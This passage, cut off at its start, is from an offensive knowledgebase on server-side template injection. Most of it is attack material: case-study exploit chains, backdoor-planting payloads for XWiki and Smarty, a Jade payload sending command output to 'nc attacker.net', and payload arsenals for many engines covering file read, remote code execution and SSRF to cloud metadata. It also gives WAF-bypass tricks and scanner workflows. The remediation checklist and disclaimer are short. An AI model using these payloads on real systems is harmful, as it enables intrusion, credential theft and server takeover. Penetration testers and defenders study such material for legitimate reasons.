do_csrf.setRequestHeader('Alfresco-CSRFToken',tok);
do_csrf.send('{"prop_cm_name":"folder.get.html.ftl","prop_cm_content":"<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(url.getArgs())}","prop_cm_description":""}');
```

### Case Study 2: XWiki Enterprise (Velocity)

**Vulnerability**: Velocity template injection + privilege escalation
**Impact**: Anonymous user → RCE via privilege escalation

**Chain:**
1. Attacker creates wiki page with Velocity code
2. Velocity checks if viewer has "programming" rights
3. If yes, page replaces its own content with Python backdoor
4. Admin with programming rights views page → backdoor installed
5. Any subsequent viewer can execute shell commands

**Key Payload:**
```velocity
innocent content
#if( $doc.hasAccessLevel("programming") )
    $doc.setContent("
        innocent content
        {{python}}from subprocess import check_output
        q = request.get('q') or 'true'
        q = q.split(' ')
        print ''+check_output(q)+''
        {{/python}}
    ")
    $doc.save()
#end
```

### Case Study 3: CodePen.io (Jade/Pug)

**Vulnerability**: User-submitted templates in Jade
**Impact**: RCE on template rendering server

**Chain:**
1. Attacker submits Jade template
2. Jade compiles to JavaScript and executes
3. Attacker accesses `root.process` → `mainModule.require` → `child_process`

**Key Payload:**
```jade
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

### Case Study 4: Smarty (PHP) Sandbox Bypass

**Vulnerability**: Smarty secure mode bypass via `getStreamVariable`
**Impact**: Arbitrary file read + write

**Chain:**
1. Attacker accesses `self::getStreamVariable("file:///etc/passwd")`
2. Reads arbitrary files
3. Uses `Smarty_Internal_Write_File::writeFile()` to write PHP backdoor
4. Calls `self::clearConfig()` to satisfy type hint

**Key Payload:**
```smarty
{self::getStreamVariable("file:///proc/self/loginuid")}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

---

## Fuzzing Payloads

### Universal Polyglots

```
${{<%[%'"}}%\.
```

### Context-Specific Probes

**Plaintext context (all engines):**
```
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
{7*7}
{{= 7*7}}
```

**Code context (breakout attempts):**
```
}}${7*7}
}}<tag>
%><%= 7*7 %>
```

### Engine-Specific Detection Strings

| Engine | Detection Payload | Success Indicator |
|--------|-------------------|-------------------|
| Jinja2 | `{{7*'7'}}` | `7777777` |
| Twig | `{{7*'7'}}` | `49` |
| Freemarker | `${7*7}` | `49` |
| Velocity | `#set($x=7*7)${x}` | `49` |
| Smarty | `{7*7}` | `49` |
| Mako | `${7*7}` | `49` |
| ERB | `<%= 7*7 %>` | `49` |
| Handlebars | `{{7*7}}` | `49` |
| Jade/Pug | `= 7*7` | `49` |
| Thymeleaf | `${7*7}` | `49` |
| Razor (.NET) | `@(7*7)` | `49` |
| Django | `{% debug %}` | Template debug info |

### Blind SSTI Fuzzing

**Boolean-based pairs:**
```
Test 1: (3*4/2)  vs  3*)2(/4
Test 2: ((7*8)/(2*4))  vs  7)(*)8)(2/(*4
```

**Time-based:**
```
{ system("sleep 10") }
{{ sleep(10) }}
```

**Error-based:**
```
{{ (1/0).zxy.zxy }}
```

---

## Automation Workflows

### Workflow 1: Mass Detection with TInjA

```bash
# Single target
tinja url -u "http://target.com/?name=Kirlia" -H "Cookie: session=..."

# POST data
tinja url -u "http://target.com/" -d "username=Kirlia&email=test@test.com"

# With authentication
tinja url -u "http://target.com/" -H "Authorization: Bearer ey..."
```

### Workflow 2: Exploitation with SSTImap

```bash
# Interactive mode
python3 sstimap.py -i -u 'https://target.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade

# Automatic detection + shell
python3 sstimap.py -u 'https://target.com/page?name=John' -s

# POST with headers
python3 sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
```

### Workflow 3: Nuclei Mass Scanning

```bash
# Scan for SSTI with nuclei
nuclei -l targets.txt -t http/vulnerabilities/ssti/ -severity critical,high

# Specific template
nuclei -u http://target.com -t http/vulnerabilities/ssti/ssti.yaml
```

### Workflow 4: Burp Suite + Param Miner

```
1. Crawl application with Burp Spider
2. Run Param Miner → Guess headers, cookies, parameters
3. Send suspected template endpoints to Intruder
4. Use SSTI wordlist (from SecLists) for fuzzing
5. Analyze responses for mathematical evaluation or errors
```

### Workflow 5: Custom Fuzzing with ffuf + SSTI Wordlist

```bash
# Fuzz all parameters
ffuf -u "http://target.com/page?FUZZ=test" -w ssti-payloads.txt -mr "49"

# Fuzz POST body
ffuf -u "http://target.com/api" -X POST -d "FUZZ=test" -w ssti-payloads.txt -H "Content-Type: application/x-www-form-urlencoded"
```

---

## Recon Methodology

### Step 1: Identify Template Usage

**Indicators of template engine usage:**
- Email personalization features
- PDF generation from HTML
- Invoice/receipt generation
- CMS page editing with variables
- Marketing email builders
- Report generators
- Wiki pages with markup
- Comment systems with rich text

**Technology fingerprinting:**
- Wappalyzer / BuiltWith for framework detection
- Stack detection (Flask→Jinja2, Django→Django Templates, Laravel→Blade, Symfony→Twig, Spring→Freemarker/Thymeleaf, Express→Handlebars/Pug)

### Step 2: Map Input to Template Flow

```
User Input → [Parser/Preprocessor] → Template Engine → Output
                ↑
         SSTI occurs here if user input reaches template parser
```

**Questions to answer:**
1. Does user input become part of the template string?
2. Is there a template preview/edit feature?
3. Are there error pages that reflect user input?
4. Are emails/reports generated from user data?

### Step 3: Parameter Discovery

**Visible parameters:**
- URL query parameters
- POST body parameters
- JSON fields that might be rendered

**Hidden parameters (use Param Miner):**
- `template`, `view`, `format`, `render`, `engine`
- `__template`, `_tpl`, `tpl`, `layout`
- `callback`, `jsonp`, `cb`

**Headers that may affect templates:**
- `X-Template-Engine`
- `X-Render-Format`
- `Accept` (content negotiation may select different templates)

### Step 4: Engine Identification

Use the decision tree and error-based fingerprinting documented in [Detection Techniques](#detection-techniques).

### Step 5: Exploitation Planning

```
1. Read documentation for identified engine
2. Check for security considerations / warnings
3. Enumerate available objects (self, environment, request, app)
4. Look for developer-supplied objects
5. Construct object/method chains
6. Test in sandboxed environment first
7. Exfiltrate data or achieve RCE
```

---

## Nuclei Templates

### Template Logic Overview

Nuclei SSTI templates typically use:
1. **Matchers**: Check for mathematical evaluation in response
2. **Extractors**: Pull evaluated results from response
3. **Payloads**: Engine-specific detection strings

### Example Template Structure

```yaml
id: ssti-jinja2

info:
  name: Jinja2 SSTI Detection
  severity: critical
  tags: ssti,jinja2,python

requests:
  - method: GET
    path:
      - "{{BaseURL}}/page?name={{7*'7'}}"

    matchers:
      - type: word
        words:
          - "7777777"
        part: body
```

### ProjectDiscovery Nuclei SSTI Templates

Repository: `https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/ssti`

**Key templates:**
- `ssti.yaml` — Generic SSTI detection
- `ssti-jinja2.yaml` — Jinja2 specific
- `ssti-twig.yaml` — Twig specific
- `ssti-freemarker.yaml` — Freemarker specific

### Custom Nuclei Template for Blind SSTI

```yaml
id: blind-ssti-timebased

info:
  name: Blind SSTI Time-Based Detection
  severity: high

requests:
  - raw:
      - |
        GET /?name={{__import__('time').sleep(5)}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
```

---

## Tools and Scanners

### Automated Scanners

| Tool | Language | Features | URL |
|------|----------|----------|-----|
| **TInjA** | Go | SSTI + CSTI scanner, novel polyglots | Hackmanit/TInjA |
| **SSTImap** | Python 3 | Interactive, automatic detection, shell | vladko312/SSTImap |
| **tplmap** | Python 2.7 | Classic SSTI scanner (legacy) | epinna/tplmap |
| **Nuclei** | Go | Mass scanning with templates | projectdiscovery/nuclei |
| **Burp Suite** | Java | Manual + automated (Intruder, Scanner) | PortSwigger |
| **Param Miner** | Java | Hidden parameter discovery | PortSwigger |
| **HTTP Request Smuggler** | Java | HRS detection | PortSwigger |
| **katana** | Go | Crawler for finding template endpoints | projectdiscovery/katana |
| **httpx** | Go | Fast HTTP prober | projectdiscovery/httpx |

### Exploitation Tools

| Tool | Purpose |
|------|---------|
| **SSTImap** | Full exploitation with interactive shell |
| **tplmap** | Legacy but still useful for older engines |
| **Custom Python scripts** | For blind SSTI, OOB exfiltration |
| **Interactsh** | OOB interaction gathering (projectdiscovery) |

### Recon Tools

| Tool | Purpose |
|------|---------|
| **subfinder** | Subdomain enumeration |
| **katana** | Web crawler |
| **httpx** | Probing and tech detection |
| **naabu** | Port scanning |
| **notify** | Notification framework for findings |
| **uncover** | Search engine API wrapper |

### Wordlists

| Source | Content |
|--------|---------|
| **SecLists** | `Fuzzing/` — general fuzz payloads |
| **SecLists** | `Discovery/Web-Content/` — web discovery |
| **Burp Intruder** | Built-in SSTI wordlist |
| **Tplmap** | Engine-specific payload databases |

---

## Advanced Research

### Key Research Papers & Talks

1. **"Server-Side Template Injection: RCE For The Modern Web App"** — James Kettle (PortSwigger), Black Hat USA 2015
   - Original SSTI methodology (Detect → Identify → Exploit)
   - RCE zerodays for Alfresco, XWiki
   - Sandbox escapes for Smarty, Twig, CodePen

2. **"Practical Web Cache Poisoning"** — James Kettle (PortSwigger), 2018
   - Unkeyed inputs leading to cache poisoning
   - Template engines as cache poisoning vectors

3. **"HTTP Desync Attacks: Request Smuggling Reborn"** — James Kettle (PortSwigger), 2019
   - HTTP/2 downgrade desync
   - Browser-powered desync attacks
   - Combining HRS with other vulnerabilities

4. **"Cracking the Lens: Targeting HTTPS Hidden Attack Surface"** — James Kettle (PortSwigger), 2020
   - Hidden attack surfaces that may include template endpoints
   - Lens-based reconnaissance

5. **"Improving the Detection and Identification of Template Engines for Large-Scale Template Injection Scanning"** — Maximilian Hildebrand (Hackmanit), 2023
   - Polyglot-based detection
   - TInjA scanner methodology
   - 44 template engine identification table

6. **"Successful Errors: New Code Injection and SSTI Techniques"** — Vladislav Korchagin, 2026
   - Error-based detection
   - Boolean-based blind SSTI
   - Novel exploitation techniques

7. **"Template Injection On Hardened Targets"** — Lucas 'BitK' Philippe, 2022
   - Advanced sandbox bypasses
   - Hardened target exploitation

8. **"Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere"** — YesWeHack/Brumens, 2025
   - Cutting-edge RCE chains
   - Filter bypass techniques

### Emerging Research Areas

**AI-Assisted Template Injection:**
- LLM-generated templates (ChatGPT integrations) may execute user prompts as template code
- MCP (Model Context Protocol) abuse through template rendering

**Server-Side XSS (Dynamic PDF):**
- PDF generation libraries (wkhtmltopdf, Puppeteer, WeasyPrint) often use templates
- SSTI in PDF context leads to SSRF + file read via PDF rendering

**Template Injection in APIs:**
- GraphQL resolvers that construct templates
- gRPC services with template-based response formatting
- JSON:API implementations using templates for serialization

---

## Bug Bounty Writeups

### Common SSTI Bug Bounty Patterns

**High-impact targets:**
1. **Email marketing platforms** — User-defined email templates
2. **CMS/Wiki platforms** — Page templates, themes
3. **E-commerce platforms** — Invoice templates, receipt generators
4. **SaaS reporting tools** — Custom report builders
5. **Low-code/no-code platforms** — User-defined workflows with templates

### Writeup Structure for Reports

```
1. Summary: Template engine identified, injection point
2. Steps to Reproduce:
   a. Navigate to [endpoint]
   b. Input [payload] in [parameter]
   c. Observe [result]
3. Impact: RCE / File Read / SSRF / Data Exfiltration
4. Proof of Concept: [screenshot / video / curl command]
5. Remediation: Use logic-less engine or strict sandbox
```

### Example Report Payloads

**For Jinja2 (Flask):**
```
GET /profile?name={{lipsum.__globals__.os.popen('id').read()}}
Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**For Twig (Symfony):**
```
POST /api/render
Content-Type: application/json

{"template":"{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}"}
Response: uid=33(www-data)
```

---

## Payload Collections

### Mega Polyglot (44 Engines)

From Hackmanit Template Injection Table:
```
${{<%[%'"}}%\.
```

### Jinja2 Payload Arsenal

```jinja2
# Detection
{{7*7}}
{{7*'7'}}
{{config}}

# File Read
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{lipsum.__globals__.open('/etc/passwd').read()}}

# RCE
{{lipsum.__globals__.os.popen('id').read()}}
{{''.__class__.__base__.__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}

# Sandbox Bypass
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
{{request|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}

# Blind / Time-based
{{__import__('time').sleep(5)}}
```

### Twig Payload Arsenal

```twig
# Detection
{{7*7}}
{{7*'7'}}
{{dump()}}

# File Read
{{source('/etc/passwd')}}
{{include('/etc/passwd')}}
{{'/etc/passwd'|file_excerpt(1,-1)}}

# RCE (unsandboxed)
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Sandbox Bypass
{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}

# Info Disclosure
{{dump(app)}} {{dump(_self)}} {{dump(_context)}}
```

### Freemarker Payload Arsenal

```freemarker
# Detection
${7*7}
<#assign x=7*7>${x}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
<#assign rt="freemarker.ext.jython.JythonRuntime"?new()> ${rt("import os; print(os.popen('id').read())")}

# File Read (with ?api)
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>

# SSRF
<#assign url=.createObject("java.net.URL", "http://169.254.169.254/")>
<#assign conn=url.openConnection()>
${conn.getResponseCode()}
```

### Handlebars Payload Arsenal

```handlebars
# Detection
{{7*7}}
{{this}}
{{constructor}}

# RCE
{{#with this}}{{#with constructor}}{{#with (lookup this "constructor")}}{{(lookup this "exec") "id"}}{{/with}}{{/with}}{{/with}}

# File Read
{{require('fs').readFileSync('/etc/passwd')}}
{{process.mainModule.require('fs').readFileSync('/etc/passwd')}}

# Prototype Pollution to RCE (Handlebars < 4.7.7)
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

### Velocity Payload Arsenal

```velocity
# Detection
#set($x=7*7)${x}

# RCE
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")

# File Read (with output capture)
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /etc/passwd"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

# Variable bruteforce (for finding $class, $request, etc.)
# Use Burp Intruder with wordlist on variable names
```

### ERB (Ruby) Payload Arsenal

```erb
# Detection
<%= 7*7 %>

# RCE
<%= `id` %>
<%= IO.popen('id').read %>
<%= system('id') %>

# File Read
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>
<%= Dir.glob('/etc/*') %>

# SSRF
<%= Net::HTTP.get(URI('http://169.254.169.254/')) %>
```

### Mako Payload Arsenal

```mako
# Detection
${7*7}

# RCE
<%
import os
x=os.popen('id').read()
%>
${x}

# File Read
<%
import os
x=os.popen('cat /etc/passwd').read()
%>
${x}
```

### Django Template Payload Arsenal

```django
# Detection
{{ 7*7 }}

# Note: Django templates are NOT vulnerable to classic SSTI by default
# (no arbitrary code execution). However, XSS via template filters is possible.

# If Jinja2 is used instead of Django templates, use Jinja2 payloads
```

### Blade (Laravel) Payload Arsenal

```blade
# Detection
{{ 7*7 }}

# Note: Blade compiles to PHP. SSTI in Blade = PHP code execution.
# If user input reaches Blade compilation:
{{ system('id') }}
{{ file_get_contents('/etc/passwd') }}
```

---

## WAF Bypasses

### Encoding Bypasses

**URL Encoding:**
```
%7B%7B7*7%7D%7D        → {{7*7}}
%257B%257B7*7%257D%257D → Double-encoded
```

**Unicode Normalization:**
```
{{7*7}}  using fullwidth braces: ［［7*7］］
{{7*7}}  using Unicode homoglyphs
```

**HTML Entities:**
```
&#123;&#123;7*7&#125;&#125;  → {{7*7}}
```

### Case Variation

Some WAFs are case-sensitive:
```jinja2
{{Lipsum.__Globals__.Os.Popen('id').Read()}}
```

### Whitespace Manipulation

```jinja2
{{ 7 * 7 }}
{{7*7}}
{{	7	*	7	}}
```

### Comment Injection

```jinja2
{{7/*comment*/7}}
{{7*7#comment}}
```

### String Concatenation

```jinja2
{{()['__cla'+'ss__']}}
{{()|attr(['_','_','c','l','a','s','s','_','_']|join)}}
```

### Using Alternative Syntax

```jinja2
{# Jinja2 alternatives #}
{% raw %}{{7*7}}{% endraw %}  # May bypass if WAF only checks rendered output
{{7*7|safe}}
```

### JSON / Content-Type Bypass

```http
POST /api HTTP/1.1
Content-Type: application/json

{"template":"{{7*7}}"}
```

Some WAFs inspect `application/x-www-form-urlencoded` more strictly than JSON.

---

## Detection Techniques

### Technique 1: Rendered Detection (Most Reliable)

Inject mathematical expression and observe evaluated result in response.

```
Input:  {{7*7}}
Output: 49
```

### Technique 2: Error-Based Detection

Inject invalid syntax and observe template engine error messages.

```
Input:  {{(1/0).zxy.zxy}}
Output: ZeroDivisionError: division by zero
```

### Technique 3: Boolean-Based Blind Detection

For cases where output is not visible:
```
True condition:  {{7*7 == 49}}
False condition: {{7*7 == 50}}
```

Observe differences in response (error vs. no error, different page content).

### Technique 4: Time-Based Blind Detection

```jinja2
{{__import__('time').sleep(5)}}
```

If response takes ~5 seconds longer, SSTI is confirmed.

### Technique 5: Out-of-Band Detection

```jinja2
{{__import__('urllib').request.urlopen('http://YOUR-INTERACTSH-SERVER')}}
```

Use Interactsh or Burp Collaborator for DNS/HTTP callbacks.

### Technique 6: Polyglot Detection

Send a single payload that triggers errors in multiple engines:
```
${{<%[%'"}}%\.
```

### Technique 7: Code Context Detection

When input is inside a template expression:
```
Step 1: Test for XSS → input<tag> (should NOT render as HTML if in code context)
Step 2: Break out    → input}}<tag> (if HTML renders, SSTI confirmed in code context)
```

### Technique 8: Header-Based Detection

Test headers that may be reflected in templates:
```http
User-Agent: {{7*7}}
Referer: {{7*7}}
X-Forwarded-For: {{7*7}}
```

### Technique 9: Second-Order Detection

User input is stored and later rendered in a template:
1. Register with name `{{7*7}}`
2. Trigger email generation or profile view
3. Observe `49` in output

---

## References

### Official Documentation

- Jinja2: https://jinja.palletsprojects.com/
- Twig: https://twig.symfony.com/
- Freemarker: https://freemarker.apache.org/
- Handlebars: https://handlebarsjs.com/
- Mustache: https://mustache.github.io/
- Django Templates: https://docs.djangoproject.com/en/stable/topics/templates/
- Blade: https://laravel.com/docs/blade
- Thymeleaf: https://www.thymeleaf.org/
- Velocity: https://velocity.apache.org/
- Smarty: https://www.smarty.net/
- Mako: https://www.makotemplates.org/

### Research Papers & Articles

- PortSwigger Research — Server-Side Template Injection (2015): https://portswigger.net/research/server-side-template-injection
- PortSwigger Web Security Academy — SSTI: https://portswigger.net/web-security/server-side-template-injection
- PortSwigger — Exploiting SSTI: https://portswigger.net/web-security/server-side-template-injection/exploiting
- PortSwigger — Practical Web Cache Poisoning (2018): https://portswigger.net/research/practical-web-cache-poisoning
- PortSwigger — HTTP Desync Attacks (2019): https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- PortSwigger — Browser-Powered Desync Attacks: https://portswigger.net/research/browser-powered-desync-attacks
- PortSwigger — Cracking the Lens (2020): https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface
- PortSwigger — Hidden OAuth Attack Vectors: https://portswigger.net/research/hidden-oauth-attack-vectors
- HackTricks SSTI: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html

### GitHub Repositories

- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- SSTI Payloads: https://github.com/payloadbox/ssti-payloads
- SSTImap: https://github.com/vladko312/SSTImap
- tplmap: https://github.com/epinna/tplmap
- Nuclei SSTI Templates: https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/ssti
- HTTP Request Smuggler: https://github.com/PortSwigger/http-request-smuggler
- Param Miner: https://github.com/PortSwigger/param-miner
- smuggler: https://github.com/defparam/smuggler
- CursedChrome: https://github.com/mandatoryprogrammer/CursedChrome
- Client-Side Prototype Pollution: https://github.com/BlackFan/client-side-prototype-pollution
- postMessage-tracker: https://github.com/fransr/postMessage-tracker
- pp-finder: https://github.com/yeswehack/pp-finder
- SecLists: https://github.com/danielmiessler/SecLists

### ProjectDiscovery Tools

- nuclei: https://github.com/projectdiscovery/nuclei
- httpx: https://github.com/projectdiscovery/httpx
- katana: https://github.com/projectdiscovery/katana
- subfinder: https://github.com/projectdiscovery/subfinder
- interactsh: https://github.com/projectdiscovery/interactsh
- notify: https://github.com/projectdiscovery/notify
- uncover: https://github.com/projectdiscovery/uncover
- dnsx: https://github.com/projectdiscovery/dnsx
- naabu: https://github.com/projectdiscovery/naabu
- mapcidr: https://github.com/projectdiscovery/mapcidr
- asnmap: https://github.com/projectdiscovery/asnmap
- cdncheck: https://github.com/projectdiscovery/cdncheck
- tlsx: https://github.com/projectdiscovery/tlsx
- alterx: https://github.com/projectdiscovery/alterx

### Additional Resources

- cariddi: https://github.com/edoardottt/cariddi
- Mozilla Template Literals: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals
- Infosec Writeups SSTI Guide: https://infosecwriteups.com/ssti-exploitation-guide-7e2d4f5b1c3a
- Advanced SSTI Techniques: https://medium.com/@filedescriptor/advanced-ssti-and-template-engine-rce-techniques-2f4d7c1b5e3d

---

## Quick Reference Card

### Detection Decision Tree

```
Start
  |
  +-- ${7*7} works?
  |     +-- Yes → Java family
  |     |         +-- a{*comment*}b works? → Smarty
  |     |         +-- ${"z".join("ab")} works? → Mako
  |     |         +-- Otherwise → Freemarker / Velocity / Thymeleaf
  |     |
  |     +-- No → Try {{7*7}}
  |               +-- Yes → Python/PHP family
  |               |         +-- {{7*'7'}} == 7777777 → Jinja2
  |               |         +-- {{7*'7'}} == 49 → Twig
  |               |         +-- Otherwise → Django / Blade / other
  |               |
  |               +-- No → Try <%= 7*7 %>
  |                         +-- Yes → ERB / Ruby
  |                         +-- No → Try {{= 7*7}}
  |                                       +-- Yes → Handlebars / Mustache (mixed)
  |                                       +-- No → Exotic engine or not vulnerable
```

### Impact Escalation Path

```
SSTI Detected
      |
      +-- Can read files? → Arbitrary File Read
      |     +-- Read config/secrets → Credential theft
      |     +-- Read source code → Find more vulns
      |
      +-- Can execute code? → RCE
      |     +-- Basic command exec → Full server takeover
      |     +-- SSRF chains → Cloud metadata → AWS/GCP/Azure keys
      |     +-- Request smuggling → Poison other users
      |     +-- Cache poisoning → Mass exploitation
      |
      +-- Can access objects? → Information Disclosure
            +-- App config → Secret keys
            +-- Request data → Session tokens
            +-- Environment → System info
```

### Remediation Checklist

- [ ] Do not allow users to submit or edit templates
- [ ] If unavoidable, use logic-less engines (Mustache, Python string.Template)
- [ ] Use strict sandbox environments with dangerous functions removed
- [ ] Deploy template processing in locked-down containers (Docker, gVisor)
- [ ] Apply defense in depth: WAF, input validation, output encoding
- [ ] Regularly audit template usage for concatenation vulnerabilities
- [ ] Keep template engines updated (patch known sandbox bypasses)

---

> **Disclaimer**: This knowledgebase is intended for authorized security testing, bug bounty hunting, and educational purposes only. Always obtain proper authorization before testing systems you do not own. The techniques described here can cause significant damage if used maliciously.

> **Contributing**: This document synthesizes research from PortSwigger, Hackmanit, ProjectDiscovery, and the wider security community. Credit goes to James Kettle, Maximilian Hildebrand, Vladislav Korchagin, Lucas Philippe, and all SSTI researchers.
